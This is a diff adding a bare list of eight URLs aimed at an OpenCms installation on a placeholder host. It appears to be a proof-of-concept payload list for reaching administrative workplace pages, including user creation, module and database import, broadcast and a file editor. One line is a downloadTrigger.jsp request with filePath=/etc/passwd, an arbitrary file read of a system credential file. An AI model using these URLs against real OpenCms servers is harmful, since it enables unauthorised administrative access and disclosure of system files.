@@ -1,0 +1,8 @@
+http://www.example.com/opencms/opencms/system/workplace/views/admin/admin-main.jsp?path=%2Fworkplace%2Flogfileview
+http://www.example.com/opencms/opencms/system/workplace/admin/workplace/logfileview/downloadTrigger.jsp?filePath=/etc/passwd
+http://www.example.com/opencms/opencms/system/workplace/editors/editor.jsp?resource=/index.jsp
+http://www.example.com/opencms/opencms/system/workplace/views/admin/admin-main.jsp?path=%2Faccounts%2Fwebusers/new
+http://www.example.com/opencms/opencms/system/workplace/views/admin/admin-main.jsp? path=%2Fmodules%2Fmodules_import
+http://www.example.com/opencms/opencms/system/workplace/views/admin/admin-main.jsp?path=%2Fdatabase%2Fimporthttp
+http://www.example.com/opencms/opencms/system/workplace/views/admin/admin-main.jsp?path=%2Fworkplace%2Fbroadcast
+http://www.example.com/opencms/opencms/system/workplace/views/admin/admin-main.jsp?path=%2Faccounts/users
